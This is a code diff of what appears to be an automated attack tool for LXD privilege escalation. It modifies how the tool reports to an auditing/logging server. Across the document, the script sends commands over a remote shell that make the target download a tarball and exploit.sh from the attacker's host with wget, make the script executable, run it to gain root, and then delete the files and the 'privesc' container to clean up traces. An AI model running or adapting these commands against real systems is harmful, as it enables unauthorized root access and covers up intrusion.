@@ -26,18 +26,16 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
 		print('[+] Waiting for connection')
 		time.sleep(0.5)
-		print('[DEBBUG] wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name))
-		print('[DEBBUG] wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port))
 		
-		start = "\n"
-		# Use the own victim command line to inform the logging server instead of creating a request
 		if general_info['active'] == 'True':
-			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
-		print('[DEBBUG]', general_info['active'], type(general_info['active']))
-		print('[DEBBUG]', general_info['active'] == 'True', general_info['active'] == "True", general_info['active'] == 'True' +"")
-		print('[DEBBUG]', start)
+			try:
+				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1))
+			except requests.exceptions.ReadTimeout:
+			    		pass
+			except requests.exceptions.ConnectTimeout:
+			    	sys.exit('[-] Failed to connect to Logging server')
 			
-		commands = [start, '''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
+		commands = ['''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
 ''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
 		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] 
 		for cmd in commands:
@@ -204,10 +202,9 @@ def recvall(sock):
 
 def cleanup(conn, file_name, general_info):
 	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
-	print('[DEBBUG] ' + 'wget -O /dev/null \'' + informAudittingStop(general_info) + '\'"$(ps aux | grep www-data | grep "sh -i" | awk \'{print $2 }\' | sed -n 2p)"')
 	if general_info['active'] == 'True':
 		try:
-			requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
+			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
 		except requests.exceptions.ReadTimeout:
 		    		pass
 		except requests.exceptions.ConnectTimeout:
@@ -220,14 +217,12 @@ def cleanup(conn, file_name, general_info):
 
 def informAudittingStart(general_info):
 	exploit = 'LXD'
-	# Pid is added on the terminal using $(echo $$)
-	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit
 	return url
 
 def informAudittingStop(general_info):
 	exploit = 'LXD'
-	# Pid is added on the terminal using $(echo $$)
-	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit
 	return url
 
 
